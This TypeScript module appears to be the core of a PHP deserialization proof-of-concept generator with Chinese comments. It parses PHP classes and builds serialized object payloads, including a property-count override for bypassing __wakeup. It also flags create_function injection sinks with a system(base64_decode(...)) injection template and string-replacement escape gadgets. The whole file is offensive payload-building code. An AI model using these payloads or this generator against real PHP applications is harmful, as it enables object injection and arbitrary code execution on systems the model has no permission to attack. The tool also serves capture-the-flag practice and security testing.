/**
 * PHP 反序列化 PoC 生成 —— 纯逻辑层。
 *
 * 从 PHP 类源码中识别类名与属性（含可见性），并按 PHP serialize() 规则
 * 生成序列化字符串（private/protected 属性名需用 NUL 字节包裹）。
 */

export interface PhpProp {
  name: string;
  visibility: 'public' | 'protected' | 'private';
}

export interface ParsedPhpClass {
  className: string;
  props: PhpProp[];
}

export interface PhpSerializedResult {
  /** 含真实 NUL 字节的原始序列化串 */
  serialized: string;
  /** NUL 以 \x00 显示的可读版本 */
  readable: string;
  /** URL 编码版本（NUL -> %00） */
  urlEncoded: string;
}

/** 从 PHP 类源码提取类名与属性（支持 public/protected/private/var，含逗号多属性与默认值） */
export function parsePhpClass(source: string): ParsedPhpClass {
  const className = source.match(/\bclass\s+([A-Za-z_]\w*)/)?.[1] ?? 'UnknownClass';
  const props: PhpProp[] = [];
  const stmtRe = /\b(public|protected|private|var)\s+(\$[A-Za-z_]\w*(?:\s*,\s*\$[A-Za-z_]\w*)*)\s*(?:=[^;]*)?;/g;
  let m: RegExpExecArray | null;
  while ((m = stmtRe.exec(source)) !== null) {
    const visibility = m[1] === 'var' ? 'public' : (m[1] as PhpProp['visibility']);
    const names = m[2].match(/\$([A-Za-z_]\w*)/g) ?? [];
    for (const n of names) props.push({ name: n.slice(1), visibility });
  }
  return { className, props };
}

/** 属性名 -> 序列化键名（private/protected 需 NUL 包裹） */
export function phpPropKey(className: string, name: string, visibility: PhpProp['visibility']): string {
  if (visibility === 'private') return `\u0000${className}\u0000${name}`;
  if (visibility === 'protected') return `\u0000*\u0000${name}`;
  return name;
}

/** 字符串字节长度（UTF-8） */
export function phpByteLength(s: string): number {
  return new TextEncoder().encode(s).length;
}

/** 序列化单个值：整数用 i:，其余按字符串 s: */
export function phpSerializeValue(value: string): string {
  if (/^-?\d+$/.test(value)) return `i:${value};`;
  return `s:${phpByteLength(value)}:"${value}";`;
}

/** 序列化一个属性键值对 */
function phpSerializeEntry(className: string, prop: PhpProp, value: string): string {
  const key = phpPropKey(className, prop.name, prop.visibility);
  return `s:${phpByteLength(key)}:"${key}";` + phpSerializeValue(value);
}

/** 根据类名、属性清单与用户赋值，生成完整序列化结果（propCount 可覆盖声明属性个数，用于 __wakeup 绕过） */
export function buildPhpSerialized(
  className: string,
  props: PhpProp[],
  values: Record<string, string>,
  propCount?: number,
): PhpSerializedResult {
  const entries: string[] = [];
  for (const p of props) {
    entries.push(phpSerializeEntry(className, p, values[p.name] ?? ''));
  }
  const body = entries.join('');
  const declared = propCount ?? props.length;
  const serialized = `O:${phpByteLength(className)}:"${className}":${declared}:{${body}}`;

  const readable = serialized.replace(/\u0000/g, '\\x00');
  let urlEncoded = '';
  try {
    urlEncoded = encodeURIComponent(serialized);
  } catch {
    urlEncoded = '(URL 编码失败)';
  }
  return { serialized, readable, urlEncoded };
}

/** create_function 注入检测结果 */
export interface CreateFunctionHint {
  /** 被当作函数调用的属性名 */
  propName: string;
  /** sink 所在方法名（可能为空） */
  methodName: string;
  /** 提示文本 */
  message: string;
}

/** 检测是否存在 create_function 注入的可能：属性被当作变量函数调用 */
export function detectCreateFunctionHint(source: string, props: PhpProp[]): CreateFunctionHint | null {
  const propNames = new Set(props.map((p) => p.name));
  if (propNames.size === 0) return null;

  const methodRe = /\bfunction\s+([A-Za-z_]\w*)\s*\(/g;
  const methods: { name: string; index: number }[] = [];
  let m: RegExpExecArray | null;
  while ((m = methodRe.exec(source)) !== null) methods.push({ name: m[1], index: m.index });

  const callRe = /\$([A-Za-z_]\w*)\s*\(/g;
  while ((m = callRe.exec(source)) !== null) {
    if (!propNames.has(m[1])) continue;
    let methodName = '';
    for (let i = methods.length - 1; i >= 0; i--) {
      if (methods[i].index < m.index) {
        methodName = methods[i].name;
        break;
      }
    }
    return {
      propName: m[1],
      methodName,
      message: `检测到属性 \$${m[1]} 被当作函数调用（变量函数 sink）${methodName ? `，位于 ${methodName}()` : ''}，可能存在 create_function 注入：将 \$${m[1]} 设为 "create_function"，把注入体放到另一属性（如 '}system(base64_decode("...")));//'）可在函数构造时执行任意代码（PHP 5.x）。`,
    };
  }
  return null;
}

/** 字符串替换逃逸检测结果 */
export interface StringReplaceHint {
  /** 检测到的替换函数名 */
  funcName: string;
  /** 提示文本 */
  message: string;
}

/** 检测字符串替换逃逸：str_replace 等替换（尤其长度不一致）作用于 serialize 结果 */
export function detectStringReplaceHint(source: string): StringReplaceHint | null {
  const m = source.match(/\b(str_replace|str_ireplace|strtr|preg_replace)\b/);
  if (!m) return null;

  const funcName = m[1];
  const hasSerialize = /\b(serialize|unserialize)\b/.test(source);
  const hasNullByte = /chr\s*\(\s*0\s*\)|\\0|\\x00/.test(source);

  let message = `检测到 ${funcName}() 字符串替换`;
  if (hasNullByte) message += `（涉及 null 字节 chr(0)/\\0/\\x00）`;
  message += '。';
  message += hasSerialize
    ? `该替换作用于 serialize()/unserialize() 流程时，若替换前后长度不一致，可造成「字符串逃逸」：s:N 声明长度与实际内容不符，从而注入额外对象（绕过 __wakeup、触发 __destruct 等）。`
    : `若该替换作用于序列化字符串且替换前后长度不一致，可造成「字符串逃逸」注入。`;

  return { funcName, message };
}
